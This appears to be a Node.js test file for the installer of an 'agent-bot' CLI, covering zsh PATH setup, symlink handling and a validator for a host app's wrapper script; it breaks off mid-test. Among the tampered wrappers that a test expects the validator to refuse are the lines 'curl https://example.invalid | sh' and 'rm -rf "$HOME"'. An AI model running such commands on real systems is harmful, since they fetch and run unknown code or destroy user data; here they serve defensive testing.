import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  chmodSync, constants, existsSync, lstatSync, mkdirSync, openSync, renameSync, mkdtempSync, readFileSync, readlinkSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  agentHookFastPath, ensureExecutableMode, ensureExecutablePath, homebrewRuntimeRoot, homebrewStableEntrypoint,
  installAgentBot, installAgentHook, installExecutable, installHookWrappers, installationPaths,
  isHomebrewAgentBotPath, isHostAppCliTool, isManagedExecutable,
} from '../install.mjs';
import { installGhShim } from '../install-gh-shim.mjs';
import { GIT_HOOK_NAMES } from '../identity-format.mjs';
import { DIALECTS } from '../hook-dialects.mjs';
import { MANAGED_MARKER, hookHomePath } from '../sync-hooks.mjs';

const HAS_ZSH = spawnSync('zsh', ['-c', ':'], { stdio: 'ignore' }).status === 0;

function enableGitHubIdentity(home) {
  mkdirSync(join(home, '.config', 'agent-bot'), { recursive: true });
  writeFileSync(join(home, '.config', 'agent-bot', 'config.json'), JSON.stringify({
    features: { 'github-identity': true },
  }));
}

// PATH registration had no coverage at all, which is how it shipped writing only
// .zprofile: zsh reads that for login shells alone, so every harness — which
// spawns non-login, non-interactive shells reading .zshenv — found no agent-bot
// and reported the runtime missing while the symlink was present.
test('PATH is registered for harness shells as well as login shells', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-path-'));
  const first = ensureExecutablePath({ home });

  assert.equal(first.updated, true);
  assert.equal(first.zshenv.updated, true);
  // .zshenv is the file every zsh reads, so it is the one a harness depends on;
  // the registration is a managed block with a dedup-guarded `path` array.
  const zshenv = readFileSync(join(home, '.zshenv'), 'utf8');
  assert.match(zshenv, /^# BEGIN agent-bot-cli$/m);
  assert.match(zshenv, /^typeset -U path PATH$/m);
  assert.match(zshenv, /^path=\("\$HOME\/\.local\/bin" \$path\)$/m);
  assert.match(zshenv, /^# END agent-bot-cli$/m);
  // .zprofile keeps its own block: appended after Homebrew's shellenv, it is
  // what puts our directory first for a login shell, with the config dir ahead
  // of the local bin.
  const zprofile = readFileSync(join(home, '.zprofile'), 'utf8');
  assert.match(zprofile, /^# BEGIN agent-bot-cli$/m);
  assert.match(zprofile, /^path=\("\$HOME\/\.config\/agent-bot\/bin" "\$HOME\/\.local\/bin" \$path\)$/m);
  assert.match(zprofile, /^# END agent-bot-cli$/m);

  const second = ensureExecutablePath({ home });
  assert.equal(second.updated, false);
  assert.equal(second.zshenv.updated, false);
  assert.equal(zshenv.match(/^# BEGIN agent-bot-cli$/gm).length, 1);
});

// The two installers write to the same files. The gh shim's old marker was the
// loose substring `.config/agent-bot/bin`, which the CLI's .zprofile line also
// contained — a shared marker would make one installer believe the other had
// already run. With managed blocks each installer owns a distinct block name.
test('the two installers do not mistake each other for themselves', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-markers-'));
  enableGitHubIdentity(home);
  ensureExecutablePath({ home });
  installGhShim({ home });

  const zshenv = readFileSync(join(home, '.zshenv'), 'utf8');
  assert.match(zshenv, /^# BEGIN agent-bot-cli$/m);
  assert.match(zshenv, /^# BEGIN agent-bot-gh-shim$/m);
  assert.equal(zshenv.match(/^# BEGIN agent-bot-cli$/gm).length, 1);
  assert.equal(zshenv.match(/^# BEGIN agent-bot-gh-shim$/gm).length, 1);
  assert.equal(zshenv.split('\n').filter((line) => line.includes('.local/bin')).length, 1);

  assert.equal(ensureExecutablePath({ home }).zshenv.updated, false);
  assert.equal(installGhShim({ home }).zshenv.updated, false);
});

// With ZDOTDIR exported — the XDG-style ~/.config/zsh layout — zsh reads
// $ZDOTDIR/.zshenv and never looks at $HOME/.zshenv. Registering the home copy
// there writes to a file nothing reads, which looks identical to having fixed
// nothing.
test('registration follows ZDOTDIR when zsh reads its startup files elsewhere', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-zdotdir-'));
  enableGitHubIdentity(home);
  const zdotdir = join(home, '.config', 'zsh');
  ensureExecutablePath({ home, env: { ZDOTDIR: zdotdir } });

  // Created even though it did not exist: it is still where zsh will look.
  assert.match(readFileSync(join(zdotdir, '.zshenv'), 'utf8'), /^# BEGIN agent-bot-cli$/m);
  assert.match(readFileSync(join(zdotdir, '.zprofile'), 'utf8'), /^# BEGIN agent-bot-cli$/m);
  assert.throws(() => readFileSync(join(home, '.zshenv'), 'utf8'), /ENOENT/);

  // The gh shim installer writes the same two files and must agree.
  installGhShim({ home, env: { ZDOTDIR: zdotdir } });
  assert.match(readFileSync(join(zdotdir, '.zshenv'), 'utf8'), /^# BEGIN agent-bot-gh-shim$/m);
  assert.throws(() => readFileSync(join(home, '.zshenv'), 'utf8'), /ENOENT/);
});

// Upgrading from the loose-export install rewrites the loose lines into managed
// blocks on the next run — that is the self-repair path for existing machines.
test('an upgrade migrates loose registrations into managed blocks', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-upgrade-'));
  writeFileSync(
    join(home, '.zprofile'),
    'export PATH="$HOME/.config/agent-bot/bin:$HOME/.local/bin:$PATH"  # agent-bot installed commands\n',
  );

  const upgrade = ensureExecutablePath({ home, env: {} });
  assert.equal(upgrade.zprofile.updated, true, 'the loose line is absorbed into a block');
  assert.equal(readFileSync(join(home, '.zprofile'), 'utf8').includes('agent-bot installed commands'), false);
  assert.match(readFileSync(join(home, '.zprofile'), 'utf8'), /^# BEGIN agent-bot-cli$/m);
  assert.equal(upgrade.zshenv.updated, true, 'the missing one is added');
  assert.equal(upgrade.updated, true, 'and the caller is told the run changed something');
});

// The test that would have prevented the bug. The existing zsh integration test
// resolves `gh`, never `agent-bot`, which is exactly why this slipped through.
test('a non-login, non-interactive zsh finds agent-bot after install', { skip: !HAS_ZSH }, () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-zsh-'));
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(join(home, '.local', 'bin', 'agent-bot'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  ensureExecutablePath({ home, env: {} });

  // A bare PATH, so .zshenv is the only thing that can put the directory back.
  const resolved = execFileSync('zsh', ['-c', 'command -v agent-bot'], {
    encoding: 'utf8',
    env: { HOME: home, ZDOTDIR: home, PATH: '/usr/bin:/bin' },
  }).trim();
  assert.equal(resolved, join(home, '.local', 'bin', 'agent-bot'));
});

// Same shell, but with zsh reading its startup files from ZDOTDIR — the case a
// home-only registration silently misses.
test('a ZDOTDIR zsh finds agent-bot after install', { skip: !HAS_ZSH }, () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-zsh-xdg-'));
  const zdotdir = join(home, '.config', 'zsh');
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(join(home, '.local', 'bin', 'agent-bot'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  ensureExecutablePath({ home, env: { ZDOTDIR: zdotdir } });

  const resolved = execFileSync('zsh', ['-c', 'command -v agent-bot'], {
    encoding: 'utf8',
    env: { HOME: home, ZDOTDIR: zdotdir, PATH: '/usr/bin:/bin' },
  }).trim();
  assert.equal(resolved, join(home, '.local', 'bin', 'agent-bot'));
});

test('installExecutable creates an idempotent ~/.local/bin/agent-bot symlink', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n');
  const installed = installExecutable({ home, entrypoint });
  assert.equal(readlinkSync(installed), entrypoint);
  assert.equal(installExecutable({ home, entrypoint }), installed);
});

for (const kind of ['relative', 'absolute']) {
  test(`installExecutable preserves and recovers a dangling ${kind} link`, () => {
    const home = mkdtempSync(join(tmpdir(), 'agent-bot-recovery-'));
    const target = kind === 'relative' ? '../../deleted-checkout/agent-bot' : join(home, 'deleted-checkout', 'agent-bot');
    const entrypoint = join(home, 'agent-bot');
    writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
    const { binDir, executable } = installationPaths(home);
    mkdirSync(binDir, { recursive: true });
    symlinkSync(target, executable);
    assert.equal(installExecutable({ home, entrypoint }), executable);
    assert.equal(readlinkSync(executable), entrypoint);
    const backups = readdirSync(binDir).filter((name) => name.startsWith('agent-bot.dangling-backup-'));
    assert.equal(backups.length, 1);
    assert.equal(readlinkSync(join(binDir, backups[0], 'agent-bot')), target);
    installExecutable({ home, entrypoint });
    assert.deepEqual(readdirSync(binDir).filter((name) => name.startsWith('agent-bot.dangling-backup-')), backups);
  });
}

for (const code of ['EACCES', 'EPERM', 'ELOOP', 'ENOTDIR']) {
  test(`installExecutable preserves links whose target inspection fails with ${code}`, () => {
    const home = mkdtempSync(join(tmpdir(), 'agent-bot-recovery-'));
    const entrypoint = join(home, 'agent-bot');
    const foreign = join(home, 'foreign');
    writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
    const { binDir, executable } = installationPaths(home);
    mkdirSync(binDir, { recursive: true });
    symlinkSync(foreign, executable);
    assert.throws(() => installExecutable({
      home, entrypoint,
      statFile: (path) => {
        if (path === foreign) throw Object.assign(new Error(code), { code });
        return statSync(path);
      },
    }), { code });
    assert.equal(readlinkSync(executable), foreign);
    assert.deepEqual(readdirSync(binDir), ['agent-bot']);
  });
}

test('installExecutable preserves a live relative foreign link and a real symlink loop', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-recovery-'));
  const entrypoint = join(home, 'agent-bot');
  const foreign = join(home, 'foreign');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
  writeFileSync(foreign, 'foreign executable', { mode: 0o755 });
  const { binDir, executable } = installationPaths(home);
  mkdirSync(binDir, { recursive: true });
  symlinkSync('../../foreign', executable);
  assert.throws(() => installExecutable({ home, entrypoint }), (error) => error.message.includes('../../foreign'));
  assert.equal(readlinkSync(executable), '../../foreign');
  assert.equal(readFileSync(foreign, 'utf8'), 'foreign executable');
  const loopHome = mkdtempSync(join(tmpdir(), 'agent-bot-loop-'));
  const loopPaths = installationPaths(loopHome);
  mkdirSync(loopPaths.binDir, { recursive: true });
  symlinkSync('agent-bot', loopPaths.executable);
  assert.throws(() => installExecutable({ home: loopHome, entrypoint }), { code: 'ELOOP' });
  assert.equal(readlinkSync(loopPaths.executable), 'agent-bot');
});

test('installExecutable leaves the dangling link untouched when backup rename fails', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-recovery-'));
  const entrypoint = join(home, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
  const { binDir, executable } = installationPaths(home);
  mkdirSync(binDir, { recursive: true });
  symlinkSync('../../deleted-checkout/agent-bot', executable);
  assert.throws(() => installExecutable({
    home, entrypoint,
    rename: () => { throw Object.assign(new Error('denied'), { code: 'EACCES' }); },
  }), { code: 'EACCES' });
  assert.equal(readlinkSync(executable), '../../deleted-checkout/agent-bot');
});

test('installExecutable retains its backup when replacement creation fails', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-recovery-'));
  const entrypoint = join(home, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
  const { binDir, executable } = installationPaths(home);
  mkdirSync(binDir, { recursive: true });
  const target = '../../deleted-checkout/agent-bot';
  symlinkSync(target, executable);
  assert.throws(() => installExecutable({
    home, entrypoint,
    symlink: () => { throw Object.assign(new Error('denied'), { code: 'EACCES' }); },
  }), { code: 'EACCES' });
  const backups = readdirSync(binDir);
  assert.equal(backups.length, 1);
  assert.match(backups[0], /^agent-bot\.dangling-backup-/);
  assert.equal(readlinkSync(join(binDir, backups[0], 'agent-bot')), target);
  assert.equal(installExecutable({ home, entrypoint }), executable);
});

test('installExecutable migrates the legacy .mjs symlink to the launcher', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const legacy = join(root, 'agent-bot.mjs');
  const entrypoint = join(root, 'agent-bot');
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(legacy, '#!/usr/bin/env node\n');
  writeFileSync(entrypoint, '#!/bin/sh\n');
  symlinkSync(legacy, join(home, '.local', 'bin', 'agent-bot'));

  const installed = installExecutable({ home, entrypoint });
  assert.equal(readlinkSync(installed), entrypoint);
});

test('installExecutable refuses a foreign same-basename symlink', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const foreignRoot = mkdtempSync(join(tmpdir(), 'foreign-agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  const foreign = join(foreignRoot, 'agent-bot');
  const installed = join(home, '.local', 'bin', 'agent-bot');
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(entrypoint, '#!/bin/sh\n');
  writeFileSync(foreign, '#!/bin/sh\n');
  symlinkSync(foreign, installed);

  assert.throws(() => installExecutable({ home, entrypoint }), (error) => {
    assert.match(error.message, /not an agent-bot symlink/);
    assert.ok(error.message.includes(foreign));
    return true;
  });
  assert.equal(readlinkSync(installed), foreign);
});

test('installExecutable pins a Homebrew keg to the stable opt wrapper', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const prefix = mkdtempSync(join(tmpdir(), 'agent-bot-prefix-'));
  const cellar = join(prefix, 'Cellar', 'agent-bot', '0.2.0', 'libexec');
  const optBin = join(prefix, 'opt', 'agent-bot', 'bin');
  mkdirSync(cellar, { recursive: true });
  mkdirSync(optBin, { recursive: true });
  const entrypoint = join(cellar, 'agent-bot');
  const stable = join(optBin, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n');
  writeFileSync(stable, '#!/bin/sh\n');

  assert.equal(homebrewStableEntrypoint(entrypoint), stable);
  const installed = installExecutable({ home, entrypoint });
  assert.equal(readlinkSync(installed), stable);
  assert.equal(installExecutable({ home, entrypoint }), installed);
});

test('installExecutable replaces a stale Homebrew Cellar keg symlink', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const prefix = mkdtempSync(join(tmpdir(), 'agent-bot-prefix-'));
  const oldCellar = join(prefix, 'Cellar', 'agent-bot', '0.2.0', 'libexec', 'agent-bot');
  const newCellar = join(prefix, 'Cellar', 'agent-bot', '0.2.1', 'libexec', 'agent-bot');
  const stable = join(prefix, 'opt', 'agent-bot', 'bin', 'agent-bot');
  mkdirSync(dirname(oldCellar), { recursive: true });
  mkdirSync(dirname(newCellar), { recursive: true });
  mkdirSync(dirname(stable), { recursive: true });
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(oldCellar, '#!/bin/sh\n');
  writeFileSync(newCellar, '#!/bin/sh\n');
  writeFileSync(stable, '#!/bin/sh\n');
  const installed = join(home, '.local', 'bin', 'agent-bot');
  symlinkSync(oldCellar, installed);

  assert.equal(isHomebrewAgentBotPath(oldCellar), true);
  assert.equal(
    isManagedExecutable(installed, { isSymbolicLink: () => true }, newCellar),
    true,
  );
  assert.equal(installExecutable({ home, entrypoint: newCellar }), installed);
  assert.equal(readlinkSync(installed), stable);
});

test('homebrewRuntimeRoot maps the bin wrapper and libexec entrypoints to the keg libexec', () => {
  assert.equal(
    homebrewRuntimeRoot('/opt/homebrew/opt/agent-bot/bin/agent-bot'),
    '/opt/homebrew/opt/agent-bot/libexec',
  );
  assert.equal(
    homebrewRuntimeRoot('/usr/local/Cellar/agent-bot/0.3.1/libexec/agent-bot'),
    '/usr/local/Cellar/agent-bot/0.3.1/libexec',
  );
  assert.equal(homebrewRuntimeRoot('/home/user/checkout/agent-bot'), null);
  assert.equal(homebrewRuntimeRoot('/opt/homebrew/opt/agent-bot/libexec/skills/agent-bot'), null);
});

test('installExecutable refuses a foreign executable', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  writeFileSync(join(home, '.local', 'bin', 'agent-bot'), 'foreign\n');
  assert.throws(() => installExecutable({ home, chmod: () => {} }), /not an agent-bot symlink/);
});

// GeniusBar's "Install command-line tools" writes this exact wrapper (#968).
const GENIUSBAR = '/Applications/GeniusBar.app';
function geniusBarWrapper(shim = `${GENIUSBAR}/Contents/Resources/bin/agent-bot`) {
  return `#!/bin/sh\n# geniusbar-cli-tool: written by GeniusBar. "Uninstall command-line tools" removes it.\nexec '${shim}' "$@"\n`;
}

function homeWithCliFile(text) {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n');
  const installed = join(home, '.local', 'bin', 'agent-bot');
  mkdirSync(dirname(installed), { recursive: true });
  writeFileSync(installed, text, { mode: 0o755 });
  return { home, entrypoint, installed };
}

test('installExecutable leaves the embedding app\'s command-line tools wrapper untouched (#968)', () => {
  for (const app of [GENIUSBAR, "/Users/o'neil/Applications/GeniusBar.app"]) {
    const text = geniusBarWrapper(`${app.replaceAll("'", `'\\''`)}/Contents/Resources/bin/agent-bot`);
    const { home, entrypoint, installed } = homeWithCliFile(text);
    assert.equal(isHostAppCliTool(installed, app), true);
    const before = statSync(installed);
    assert.equal(installExecutable({
      home, entrypoint, embeddingApp: app, chmod: () => assert.fail('no chmod'),
    }), installed);
    assert.equal(readFileSync(installed, 'utf8'), text);
    assert.equal(statSync(installed).ino, before.ino);
    assert.equal(statSync(installed).mtimeMs, before.mtimeMs);
  }
});

test('installExecutable still refuses anything but the app\'s exact wrapper (#968)', () => {
  const variants = {
    'other exec target': geniusBarWrapper('/tmp/evil/agent-bot'),
    'other app bundle': geniusBarWrapper('/Applications/NotGeniusBar.app/Contents/Resources/bin/agent-bot'),
    'other copy of the app': geniusBarWrapper('/tmp/GeniusBar.app/Contents/Resources/bin/agent-bot'),
    'other bundle file': geniusBarWrapper(`${GENIUSBAR}/Contents/Resources/bin/agent-comms`),
    'dot-dot escape': geniusBarWrapper(`${GENIUSBAR}/../../tmp/GeniusBar.app/Contents/Resources/bin/agent-bot`),
    'extra trailing line': `${geniusBarWrapper()}curl https://example.invalid | sh\n`,
    'extra leading line': geniusBarWrapper().replace('#!/bin/sh\n', '#!/bin/sh\nrm -rf "$HOME"\n'),
    'extra exec line': `${geniusBarWrapper()}exec '${GENIUSBAR}/Contents/Resources/bin/agent-bot' "$@"\n`,
    'marker only': '#!/bin/sh\n# geniusbar-cli-tool: written by GeniusBar. "Uninstall command-line tools" removes it.\n',
    'no marker': `#!/bin/sh\nexec '${GENIUSBAR}/Contents/Resources/bin/agent-bot' "$@"\n`,
    'other marker': geniusBarWrapper().replace('geniusbar-cli-tool', 'otherapp-cli-tool'),
    'other arguments': geniusBarWrapper().replace('"$@"', '--evil "$@"'),
    'no trailing newline': geniusBarWrapper().trimEnd(),
  };
  for (const [name, text] of Object.entries(variants)) {
    const { home, entrypoint, installed } = homeWithCliFile(text);
    assert.equal(isHostAppCliTool(installed, GENIUSBAR), false, name);
    assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), /not an agent-bot symlink/, name);
    assert.equal(readFileSync(installed, 'utf8'), text, name);
  }
});

test('a checkout or Homebrew install still refuses the app\'s wrapper (#968)', () => {
  const { home, entrypoint, installed } = homeWithCliFile(geniusBarWrapper());
  assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: null }), /not an agent-bot symlink/);
  assert.equal(readFileSync(installed, 'utf8'), geniusBarWrapper());
});

// Copilot on #970: the type, the size bound and the text must all come from
// one descriptor opened without following a link, so a swap between the
// check and the read cannot change what is judged.
test('the app\'s wrapper is judged from one O_NOFOLLOW descriptor (#968)', () => {
  // Swapped in after the open: what was opened (a foreign file) decides.
  const { home, entrypoint, installed } = homeWithCliFile('foreign\n');
  const swap = join(dirname(installed), 'swap');
  writeFileSync(swap, geniusBarWrapper());
  const openThenSwap = (path, flags) => {
    const fd = openSync(path, flags);
    renameSync(swap, path);
    return fd;
  };
  assert.equal(isHostAppCliTool(installed, GENIUSBAR, { open: openThenSwap }), false);
  writeFileSync(installed, 'foreign\n');
  writeFileSync(swap, geniusBarWrapper());
  assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR, openFile: openThenSwap }),
    /not an agent-bot symlink/);

  // The open never follows a link and never blocks on a FIFO.
  const flags = [];
  isHostAppCliTool(installed, GENIUSBAR, { open: (path, value) => { flags.push(value); return openSync(path, value); } });
  assert.equal(flags[0] & constants.O_NOFOLLOW, constants.O_NOFOLLOW);
  assert.equal(flags[0] & constants.O_NONBLOCK, constants.O_NONBLOCK);

  // The size bound comes from the descriptor: the wrapper padded past 4 KiB.
  writeFileSync(installed, `${geniusBarWrapper()}${'#'.repeat(5000)}\n`);
  assert.equal(isHostAppCliTool(installed, GENIUSBAR), false);
});

test('a FIFO at the CLI path is refused without blocking (#968)', { skip: process.platform === 'win32' }, () => {
  const { installed } = homeWithCliFile('');
  rmSync(installed);
  execFileSync('mkfifo', [installed]);
  assert.equal(isHostAppCliTool(installed, GENIUSBAR), false);
});

test('a symlink at the CLI path is never read as the app\'s wrapper (#968)', () => {
  const { home, entrypoint, installed } = homeWithCliFile('');
  const foreign = join(mkdtempSync(join(tmpdir(), 'foreign-agent-bot-root-')), 'agent-bot');
  writeFileSync(foreign, geniusBarWrapper());
  rmSync(installed);
  symlinkSync(foreign, installed);
  assert.equal(isHostAppCliTool(installed, GENIUSBAR), false);
  assert.throws(() => installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), /not an agent-bot symlink/);
  assert.equal(readlinkSync(installed), foreign);
  // A link to this runtime is still managed as before when an app embeds it.
  rmSync(installed);
  symlinkSync(entrypoint, installed);
  assert.equal(installExecutable({ home, entrypoint, embeddingApp: GENIUSBAR }), installed);
  assert.equal(readlinkSync(installed), entrypoint);
});

// A Homebrew keg under an admin-owned prefix ships the entrypoint and hooks
// already 0755 but owned by another user. The installer used to chmod them
// unconditionally, and that no-op chmod failed with EPERM for the invoking
// user, so bootstrap reported runtime-install-failed on every managed Mac.
function epermChmod() {
  const error = new Error('EPERM: operation not permitted, chmod');
  error.code = 'EPERM';
  throw error;
}

test('installExecutable does not chmod an already-executable entrypoint it does not own', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o755 });
  chmodSync(entrypoint, 0o755);
  const installed = installExecutable({ home, entrypoint, chmod: epermChmod });
  assert.equal(readlinkSync(installed), entrypoint);
});

test('installExecutable leaves a read-only 0555 entrypoint alone', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o555 });
  chmodSync(entrypoint, 0o555);
  const installed = installExecutable({ home, entrypoint, chmod: epermChmod });
  assert.equal(readlinkSync(installed), entrypoint);
});

test('installExecutable still repairs a non-executable entrypoint it owns', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o644 });
  chmodSync(entrypoint, 0o644);
  const calls = [];
  installExecutable({ home, entrypoint, chmod: (path, mode) => calls.push([path, mode]) });
  assert.deepEqual(calls, [[entrypoint, 0o755]]);
});

test('ensureExecutableMode names the owner problem when a needed chmod is refused', () => {
  const root = mkdtempSync(join(tmpdir(), 'agent-bot-root-'));
  const entrypoint = join(root, 'agent-bot');
  writeFileSync(entrypoint, '#!/bin/sh\n', { mode: 0o644 });
  chmodSync(entrypoint, 0o644);
  assert.throws(
    () => ensureExecutableMode(entrypoint, { chmod: epermChmod }),
    (error) => error.code === 'EPERM' && /owned by another user/.test(error.message),
  );
});

test('hook wrappers install from already-executable source hooks another user owns', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-hooks-'));
  const source = mkdtempSync(join(tmpdir(), 'agent-bot-source-'));
  for (const name of [...GIT_HOOK_NAMES, 'chain-hook']) {
    writeFileSync(join(source, name), '#!/bin/sh\n', { mode: 0o755 });
    chmodSync(join(source, name), 0o755);
  }
  const hooks = installHookWrappers({ home, sourceHooks: source, chmod: epermChmod });
  assert.match(readFileSync(join(hooks, 'pre-commit'), 'utf8'), /agent-bot.*hook pre-commit/);
});

test('hook wrappers dispatch through the stable executable', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-hooks-'));
  const source = mkdtempSync(join(tmpdir(), 'agent-bot-source-'));
  for (const name of GIT_HOOK_NAMES) writeFileSync(join(source, name), '#!/bin/sh\n');
  writeFileSync(join(source, 'chain-hook'), '#!/bin/sh\n');
  const hooks = installHookWrappers({ home, sourceHooks: source });
  assert.match(readFileSync(join(hooks, 'pre-commit'), 'utf8'), /agent-bot.*hook pre-commit/);
});

test('installed adapter always invokes mandatory guards even without executable project hooks', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-fast-hook-'));
  const repo = mkdtempSync(join(tmpdir(), 'agent-bot-fast-repo-'));
  const hooks = join(repo, 'agent-hooks', 'pre-command');
  const calls = join(home, 'calls');
  const runner = join(home, 'runner');
  mkdirSync(hooks, { recursive: true });
  writeFileSync(runner, `#!/bin/sh
printf '%s\\n' "$*" >"${calls}"
exit 42
`, { mode: 0o755 });
  const fast = installAgentHook({ home });
  const env = {
    ...process.env,
    AGENT_BOT_BIN: runner,
    AGENT_BOT_HOOKS_DIR: join(repo, 'agent-hooks'),
    HOME: home,
  };

  // A nonexecutable project hook must not suppress mandatory runner checks.
  writeFileSync(join(hooks, '50-disabled'), '#!/bin/sh\\nexit 0\\n', { mode: 0o644 });
  const cursor = spawnSync(fast, ['--dialect', 'cursor', '--event', 'pre-command'], {
    env,
    encoding: 'utf8',
  });
  assert.equal(cursor.status, 42);
  assert.equal(readFileSync(calls, 'utf8').trim(), 'agent-hook --dialect cursor --event pre-command');

  // No project hook directory at all must take the same guarded path.
  rmSync(join(repo, 'agent-hooks'), { recursive: true, force: true });
  const claude = spawnSync(fast, ['--dialect', 'claude', '--event', 'pre-command'], {
    env, encoding: 'utf8',
  });
  assert.equal(claude.status, 42);
  assert.equal(readFileSync(calls, 'utf8').trim(), 'agent-hook --dialect claude --event pre-command');
});

test('installed adapter fails closed when the mandatory runner is unavailable', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-fast-missing-'));
  const fast = installAgentHook({ home });
  const missing = join(home, 'missing-runner');
  const result = spawnSync(fast, ['--dialect', 'cursor', '--event', 'pre-command'], {
    env: { ...process.env, HOME: home, AGENT_BOT_BIN: missing },
    encoding: 'utf8',
  });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /security hook runner is missing/);
});

test('the agent-hook fast path falls back to toolkit hooks in a consumer repo', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-fast-fallback-home-'));
  const toolkit = mkdtempSync(join(tmpdir(), 'agent-bot-fast-fallback-toolkit-'));
  const consumer = mkdtempSync(join(tmpdir(), 'agent-bot-fast-fallback-consumer-'));
  const calls = join(home, 'calls');
  const runner = join(toolkit, 'agent-bot.mjs');
  const hook = join(toolkit, 'agent-hooks', 'pre-push', '50-policy');
  mkdirSync(join(home, '.local', 'bin'), { recursive: true });
  mkdirSync(join(toolkit, 'agent-hooks', 'pre-push'), { recursive: true });
  writeFileSync(runner, `#!/bin/sh\nprintf '%s\\n' "$*" >"${calls}"\n`, { mode: 0o755 });
  writeFileSync(hook, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  symlinkSync(runner, join(home, '.local', 'bin', 'agent-bot'));
  execFileSync('git', ['init', '--quiet'], { cwd: consumer });
  const fast = installAgentHook({ home });
  const env = { ...process.env, HOME: home };
  delete env.AGENT_BOT_BIN;
  delete env.AGENT_BOT_HOOKS_DIR;

  const run = spawnSync(fast, ['--dialect', 'git', '--event', 'pre-push'], {
    cwd: consumer,
    env,
  });
  assert.equal(run.status, 0);
  assert.equal(readFileSync(calls, 'utf8').trim(), 'agent-hook --dialect git --event pre-push');
});

test('the installed fast path is the managed POSIX implementation', () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-fast-install-'));
  const path = installAgentHook({ home });
  assert.equal(readFileSync(path, 'utf8'), agentHookFastPath());
});

test('installer chains displaced hooks and replaces legacy agent-bot hooks', async () => {
  const home = mkdtempSync(join(tmpdir(), 'agent-bot-install-'));
  const values = new Map([['core.hooksPath', '/custom/husky-hooks']]);
  const run = (args) => {
    const key = args.at(-1);
    if (args.includes('--get')) {
      if (!values.has(key)) {
        const error = new Error('unset');
        error.status = 1;
        throw error;
      }
      return values.get(key);
    }
    values.set(args.at(-2), args.at(-1));
    return '';
  };
  const result = await installAgentBot({
    home,
    run,
    installCli: () => installationPaths(home).executable,
    installHooks: () => installationPaths(home).hooksDir,
    ensureSupervisor: async () => ({ applied: true, loaded: true, unitPath: 'test' }),
    ensureCutover: () => ({ applied: false, reason: 'nothing-to-move' }),
  });
  assert.equal(result.chainedHooksPath, '/custom/husky-hooks');
  assert.equal(values.get('agentBot.chainedHooksPath'), '/custom/husky-hooks');
  assert.equal(values.get('core.hooksPath'), result.hooksPath);

  values.set('core.hooksPath', '/repo/playbook-engineering/tools/agent-bot/hooks');
  values.delete('agentBot.chainedHooksPath');
